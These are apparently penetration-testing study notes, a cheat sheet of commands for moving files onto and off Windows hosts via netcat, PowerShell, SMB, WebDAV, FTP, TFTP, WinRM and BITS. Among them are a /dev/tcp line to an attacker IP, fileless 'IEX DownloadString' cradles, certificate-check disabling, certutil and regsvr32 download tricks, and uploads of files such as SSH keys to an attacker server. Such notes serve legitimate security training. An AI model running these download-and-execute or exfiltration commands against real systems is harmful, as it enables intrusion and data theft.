# Downloading to Windows

## Netcat

### NetCat Receiving File via Bind Shell
```powershell
# Cmd prompt only.  < > don't work in PS
nc -l -p [Port] > [Input_File]
```

### Ncat Receiving File via Bind Shell
```powershell
ncat -l -p [Port] --recv-only > [Input_File]
```

### NetCat Receiving File via Reverse Shell
```powershell
cat < /dev/tcp/[Attacker_IP]/[Port] > [Input_File]
```


## PowerShell B64 Encode & Decode

### Check SSH Key MD5 hash in Kali
```bash
# kali
md5sum id_rsa
	4e301756a07ded0a2dd6953abf015278 id_rsa
```

### Encode SSH Key to Base64 in Kali
```bash
cat id_rsa | base64 -w 0; echo
	[Base64_Output]
```

### Copy and Paste Content into Windows
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("[Base64_Output]"))
```

### Confirm MD5 Hashes Match
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
	Algorithm     Hash                                Path
	---------     ----                                ----
	MD5           4E301756A07DED0A2DD6953ABF015278    C:\Users\Public\id_rsa
```


## System.Net.WebClient class
- Used to download a file over HTTP, HTTPS, or FTP.

| Method              | Description                                                                             |
| ------------------- | --------------------------------------------------------------------------------------- |
| OpenRead            | Returns the data from a resource as a Stream                                            |
| OpenReadAsync       | Returns the data from a resource w/o blocking the calling thread                        |
| DownloadData        | Downloads data from a recourse and returns a Byte array                                 |
| DownloadDataAsync   | Downloads data from a recourse and returns a Byte array w/o blocking the calling thread |
| DownloadFile        | Downloads data from a resource to a local file                                          |
| DownloadFileAsync   | Downloads data from a resource to a local file w/o blocking the calling thread          |
| DownloadString      | Downloads a String from a resource and returns a String                                 |
| DownloadStringAsync | Downloads a String from a resource and returns a String w/o blocking the calling thread |

### DownloadFile Method
```powershell
(New-Object Net.WebClient).DownloadFile('[Target_File_URL]','[Output_File]')

(New-Object Net.WebClient).DownloadFileAsync('[Target_File_URL]','[Output_File]')
```

### DownloadString - Fileless Method
```powershell
IEX (New-Object Net.WebClient).DownloadString('[Target_File_URL]')
# Can also pipe
(New-Object Net.WebClient).DownloadString('[Target_File_URL]') | IEX
```

### Invoke-WebRequest
- Slower at downloading files.  Can use aliases `iwr`,`curl`, and `wget` instead of the full name

```powershell
Invoke-WebRequest -uri [Target_File_URL] -Outfile [Output_File]
```

[more download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)


### PowerShell Errors

- If IE's first-launch config hasn't been completed, it'll prevent a download and error out:
```powershell
# Error
PS C:\htb> Invoke-WebRequest [Target_File_URL] | IEX

Invoke-WebRequest : The response content cannont be parsed because the Internet Explorer engine is not available, or Internet Explorer''s first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

# Fix
PS C:\htb> Invoke-WebRequest [Target_File_URL] -UseBasicParsing | IEX
```

- If the SSL/TLS secure channel certificate is not trusted:
```powershell
# Error
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('[Target_File_URL]')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	+ CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
	+ FullyQualifiedErrorId : WebException

# Fix
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('[Target_File_URL]')
```


## SMB

### Create the SMB Server
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### Copy a File from SMB Server
```powershell
C:\htb> copy \\[Target_File_URL]
	1 file(s) copied.
```

### SMB Errors

- New versions of Windows block unauthenticated guest access:
`You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.`

#### Create SMB Server w/ a Username and Password
```bash
sudo impacket-smbserver [share] -smb2support /tmp/smbshare -user [utest] -password [ptest]
```

#### Mount the SMB Server with Username and Password
```powershell
C:\htb> net use n: \\[Target_URL]\[share] /user:[utest] [ptest]

The command completed successfully.

C:\htb> copy n:\[Target_File]
	1 file(s) copied.
```


## WinRM
- Ports 5985/HTTP & 5986/HTTPS
- Reqs:
	- Admin access
	- Member of `Remote Management Users` group
  
- Scenario:
	- Transfer from Win1 to Win2
	- Have `Administrator` session on Win1 w/ admin rights on Win2

### Confirm WinRM port is Open
```powershell
Test-NetConnection -ComputerName [Win2_Hostname] -Port 5985
	ComputerName     : [Win2_Hostname]
	RemoteAddress    : [Win2_IP]
	RemotePort       : 5985
	InterfaceAlias   : Ethernet0
	SourceAddress    : [Win1_IP]
	TcpTestSucceeded : True
```
	- As the session already has privs over Win2, no creds are needed

### Create a PowerShell Remoting Session to Win2
```powershell
# In Win1
$Session = New-PSSession -ComputerName [Win2_Hostname]
```

### Copy File from Localhost(Win1) to Win2 Session
```powershell
# In Win1
Copy-Item -Path [Input_File_Path] -ToSession $Session -Destination [Output_Path]
```

### Copy File from Win2 Session to Localhost(Win1)
```powershell
# In Win1
Copy-Item -Path [Input_File_Path] -Destination [Output_Path] -FromSession $Session
```


## FTP

### Installing the FTP Server Python3 Module - pyftpdlib
```bash
sudo pip3 install pyftpdlib
```

### Setting up a Python3 FTP Server
```bash
sudo python3 -m pyftpdlib --port 21
```
	- Default port is 2121

### Transferring Files from an FTP Server Using PowerShell
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://[Target_File_URL]', '[Output_File]')
```

### Create a Command File for the FTP Client and Download the Target File
```powershell
C:\htb> echo open [Target_URL] > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
# MAY NEED C:\htb> echo quote pasv >>ftpcommand.txt
C:\htb> echo GET [Target_File] >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
	ftp> open [Target_URL]
	Login with USER and PASS first.
	ftp> USER anonymous
	
	ftp> GET file.txt
	ftp> bye
	
C:\htb> more file.txt
This is a test file
```

## PureFTP

### Setting up a PureFTP server
```bash
sudo apt update && sudo apt install pure-ftpd

cat > setup-ftp.sh
#!/bin/bash

sudo groupadd ftpgroup  
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
sudo pure-pw useradd offsec -u ftpuser -d /ftphome  
sudo pure-pw mkdb  
cd /etc/pure-ftpd/auth/  
sudo ln -s ../conf/PureDB 60pdb  
sudo mkdir -p /ftphome  
sudo chown -R ftpuser:ftpgroup /ftphome/  
sudo systemctl restart pure-ftpd.service
#Ctrl + D

chmod +x setup-ftp.sh
./setup-ftp.sh
systemctl status pure-ftpd
```

## TFTP
- UDP-based file transfer protocol
- Often restricted by corporate egress firewall rules
- Useful to transfer files from older Windows operating systems - up to Windows XP and 2003
- Not installed by default on systems running Windows 7, Windows 2008, and newer.  

### Setting up a TFTP server
```bash
sudo apt update && sudo apt install atftp  
sudo mkdir /tftp  
sudo chown nobody: /tftp  
sudo atftpd --daemon --port 69 /tftp
```

### Downloading from TFTP server
```powershell
C:\Users> tftp -i [Target_IP] GET [Target_File]
```

## Enable Passive Mode
```shell
# Linux
passive

# Windows
quote pasv
```


## Misc

### Certutil.exe
```powershell
certutil.exe -urlcache -f [Target_File_URL] [Output_File]
```

### BitsTransfer
```powershell
Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File]
```

### regsrv32.exe
```powershell
regsvr32.exe /s /n /u /i:[Target_File_URL] scrobj.dll
```

### BitsTransfer
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]"
```

### BitsTransfer w/ Authentication
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -Description "[Backup]" -DisplayName "[Backup]" -Credential [Username\Domain]
```



# Uploading from Windows

## Web Uploads
- PowerShell doesn't have a built-in function for upload ops.  Can use `Invoke-WebRequest` or `Invoke-RestMethod`.  Will need a web server that accepts uploads.

### Installing a Configured WebServer with Upload (on Linux)
```bash
pip3 install uploadserver
	Collecting upload server
		Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
	Installing collected packages: uploadserver
	Successfully installed uploadserver-2.0.1


python3 -m uploadserver
	File upload available at /upload
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### OR Install and Configure updog
```bash
pip3 install updog

updog -d [Root Directory] -p [Port]
```

### PowerShell Script to Upload a File to Python Upload Server
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/refs/heads/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri [Target_Upload_URL] -File [Input_File]

	[+] File Uploaded: [Input_File]
	[+] FileHash: [File_Hash]
```
	- Uses the PowerShell script `PSUpload.ps1` (which uses Invoke-RestMethod) to perform the upload ops


## NC

### PowerShell Base64 Web Upload
```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path '[Input_File]' -Encoding Byte))

###### START A NC LISTENER IN KALI

PS C:\htb> Invoke-WebRequest -Uri [Target_Upload_URL] -Method POST -Body $b64
```

### Decode w/ base64 and Convert String to a File
```bash
# Copy output from listener

echo [Base64_Output] | base64 -d -w 0 > [Output_File]
```


## SMB
- Enterprises typically don't allow SMB out of their internal network as it opens them up to potential attacks.

> If no restrictions on SMB:

### Create SMB Server
```bash
sudo impacket-smbserver share -smb2support [Target_Share_Directory]
```


> If restricted:
- An alternative is to run SMB over HTTP with `webdav`
- When using SMB, it first attempts to connect using its protocol, but will revert to HTTP if unavailable.

### Install & Configure WebDAV Server on Linux
```bash
sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=[Port] --root=[Root_Directory] --auth=anonymous
```

### Connect to WebDAV Share
```powershell
C:\htb> dir \\[Target_URL]\DavWWWRoot

	Volume in drive \\[Target_URL]\DavWWWRoot has no label.
	Volume Serial Number is 0000-0000
	
	Directory of \\[Target_URL]\DavWWWRoot
	
	05/18/2022  10:05 AM   <DIR>            .
	05/18/2022  10:05 AM   <DIR>            ..
	05/18/2022  10:05 AM   <DIR>            sharefolder
	05/18/2022  10:05 AM   <DIR>         13 filetest.txt
					1 File(s)            13 bytes
					3 Dir(s) 43,443,318,784 bytes free
```
	- DavWWWRoot is a special keyword recognized by the Windows Shell.  It doesn't exist on the server.
		- Tells the Mini-Redirector driver which handles WebDAV requests that you're connecting to the root.
		- Can avoid using this keyword if you specify a folder that exists on the server when connecting to it.  Ex: \\[Target_URL]\sharefolder


### Uploading Files using SMB
```powershell
C:\htb> copy [Input_File_Name] \\[Target_URL]\DavWWWRoot\

# OR
C:\htb> copy [Input_File_Name] \\[Target_URL]\[Target_Folder]\
```


## FTP

### Specify Option to Allow Clients to Upload Files for pyftpdlib
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

### PowerShell Upload File
```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://[Target_Server_URL]/[Target_Dir]', '[Input_File]')
```

### OR Create Command File to Upload via FTP Client
```powershell
C:\htb> echo open [Target_IP] > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
..
C:\htb> echo PUT [Input_File_Name] >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
	ftp> open [Target_IP]
	
	Log in with USER and PASS first.
	
	ftp> USER anonymous
	ftp> PUT [Input_File]
	ftp> bye
```

## Misc

### BitsTransfer
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source [Output_File] -Destination [Target_File_URL] -TransferType Upload
```

### BitsTransfer w/ Authentication
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source [Target_File_URL] -Destination [Output_File] -TransferType Upload -Credential [Username\Domain]
```